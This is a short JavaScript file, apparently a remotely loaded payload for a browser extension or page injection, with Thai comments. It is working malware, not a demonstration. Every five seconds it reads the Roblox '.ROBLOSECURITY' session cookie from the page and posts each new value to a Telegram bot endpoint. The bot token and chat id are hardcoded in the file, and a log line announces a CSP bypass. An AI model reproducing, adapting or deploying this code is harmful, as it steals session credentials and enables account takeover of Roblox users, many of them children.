// remote-logic.js
(function() {
    console.log("--- REMOTE SCRIPT IS RUNNING (CSP BYPASS) ---");
    document.body.style.border = "5px solid green"; 

    let lastCookie = "";

    // ฟังก์ชันสำหรับดึงค่า Cookie เฉพาะชื่อที่ต้องการจากหน้าเว็บ
    function getCookieByName(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
        return null;
    }

    async function checkCookie() {
        // เปลี่ยนจากการใช้ chrome.cookies มาเป็นการอ่านจาก document.cookie โดยตรง
        const current = getCookieByName(".ROBLOSECURITY");

        if (!current) {
            console.log("Cookie not found or not accessible from this context.");
            return;
        }

        if (current !== lastCookie) {
            lastCookie = current;

            // ส่งข้อมูลไปยัง Telegram
            try {
                await fetch("https://api.telegram.org/bot8622001163:AAFzrmxcoDLJKS51yyyddOceU_iUoOooWZ0/sendMessage", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: "8508643177",
                        text: "Roblox Cookie ใหม่ (Detected from Page):\n" + current
                    })
                });
                console.log("Data sent to Telegram successfully.");
            } catch (error) {
                console.error("Failed to send to Telegram:", error);
            }
        }
    }

    // ใช้ setInterval แทน chrome.alarms เพราะรันบนหน้าเว็บได้ทันที
    // 5000ms = 5 วินาที
    console.log("Monitoring started...");
    setInterval(checkCookie, 5000);

})();
